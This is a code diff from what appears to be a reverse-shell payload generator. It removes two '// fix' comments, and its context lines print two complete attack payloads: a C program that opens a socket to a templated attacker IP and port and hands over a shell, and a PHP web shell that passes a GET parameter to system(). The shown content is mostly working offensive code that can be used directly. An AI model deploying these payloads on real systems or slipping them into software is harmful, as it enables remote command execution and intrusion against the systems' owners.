@@ -80,7 +80,6 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
-            // fix
             "name": "C",
             "command": "#include &lt;stdio.h>\n#include &lt;sys/socket.h>\n#include &lt;sys/types.h>\n#include &lt;stdlib.h>\n#include &lt;unistd.h>\n#include &lt;netinet/in.h>\n#include &lt;arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execve(\"{shell}\", argv, NULL);\n\n    return 0;       \n}",
             "meta": ["linux", "windows", "mac"]
@@ -116,7 +115,6 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "windows", "mac"]
         },
         {
-            // fix
             "name": "PHP cmd",
             "command": "&lt;html&gt;\n&lt;body&gt;\n&lt;form method=\"GET\" name=\"&lt;?php echo basename($_SERVER[\'PHP_SELF\']); ?&gt;\"&gt;\n&lt;input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"&gt;\n&lt;input type=\"SUBMIT\" value=\"Execute\"&gt;\n&lt;\/form&gt;\n&lt;pre&gt;\n&lt;?php\n    if(isset($_GET[\'cmd\']))\n    {\n        system($_GET[\'cmd\']);\n    }\n?&gt;\n&lt;\/pre&gt;\n&lt;\/body&gt;\n&lt;script&gt;document.getElementById(\"cmd\").focus();&lt;\/script&gt;\n&lt;\/html&gt;",
             "meta": ["linux", "windows", "mac"]
